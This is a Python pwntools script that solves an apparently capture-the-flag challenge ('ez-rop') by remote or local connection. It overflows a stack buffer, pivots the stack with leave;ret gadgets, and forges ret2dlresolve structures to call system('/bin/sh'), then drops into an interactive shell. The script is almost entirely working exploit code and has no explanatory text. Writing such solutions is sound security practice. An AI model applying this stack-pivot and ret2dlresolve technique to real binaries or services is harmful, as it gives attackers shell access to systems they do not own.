from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep
import re
import subprocess

context.arch = "amd64"
context.word_size = 64
context.bits = 64
context.os = "linux"

file = "./chall"
exe_args = []
io: process = None
PREFIX = b"> "

speed = 0.2

def debug():
    gdb.attach(io, gdbscript=
    """
    b *0x4011b7
    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote("ez-rop.challs.csc.tf", 1337)

def launch_local():
    global file, io
    io = process([file, *exe_args])
    if args.GDB:
        debug()

def solve_pow():
    leak = recvu(b"===================")
    pow = getb(leak, b") solve ", b"\n").decode()
    proc = subprocess.Popen(["solvepow", "solve", pow], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    pow = proc.communicate()[0]
    sla(b"Solution? ", pow)

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
binsh = lambda: next(libc.search(b"/bin/sh\0"))
snum = lambda a, b: sla(a, str(b).encode("iso-8859-1"))
sprefix = lambda a: sla(PREFIX, a)
choice = lambda a: snum(PREFIX, a)

def launch():
    if args.REMOTE:
        l = launch_remote
    else:
        l = launch_local
    with context.local(log_level=logging.ERROR):
        l()
    if args.POW:
        solve_pow()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1 or a == b"": a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1 or b == b"": b_ = len(d)
    return d[a_+len(a):b_]

# ================================================================
# EXPLOIT HERE
# ================================================================

with context.local(log_level=logging.ERROR):
    exe = ELF(file)
    libc = ELF("./libc.so.6")

tries = 0
# tries_prog = log.progress("Tries")
def exploit():
    vuln_noenter = 0x40119a
    leave_ret = 0x4011b6
    pop_rbp = 0x000000000040113d
    pop_rsi = 0x0000000000401165
    mov_rdi_rsi = 0x000000000040115a
    ret = 0x0000000000401016

    default_pivot = 0x404f60

    payload = flat([
        b"A"*0x60,
        default_pivot,
        vuln_noenter,
    ])
    sl(payload)
    sleep(speed)

    payload = flat([
        0x404f70+0x60,
        vuln_noenter,
        default_pivot,
        pop_rsi,
        0x404fa8, # /bin/sh
        mov_rdi_rsi,
        ret,

        0x401020, # call dlresolve
        0x310, # offset to first struct
    ], length=0x60, filler=b"\0")
    payload = flat([
        payload,
        default_pivot-0x60,
        leave_ret,
    ])
    sl(payload)
    sleep(speed)

    payload = flat([ # structures needed for ret2dlresolve
        # first struct
        0x404008, # just need to be writable
        (0x328 << 32) | 7, # offset to second struct
        0,

        b"system\0\0",

        # second struct
        p32(0x4ac8), # offset from dynstr to the system string above
        p8(0x12),
        p8(0),
        p16(0),
        0,
        0,

        b"/bin/sh\0",
    ], length=0x60, filler=b"\0")
    payload = flat([
        payload,
        default_pivot-0x60+0x10,
        leave_ret,
    ])
    sl(payload)
    sleep(speed)


    io.interactive()
    input("end")
    exit()

launch()
exploit()
exit()

while True:
    count = 0
    tries += 1
    tries_prog.status(str(tries))

    launch()
    try:
        exploit()
    except EOFError:
        pass

    with context.local(log_level=logging.ERROR):
        io.close()
    # sleep(0.05)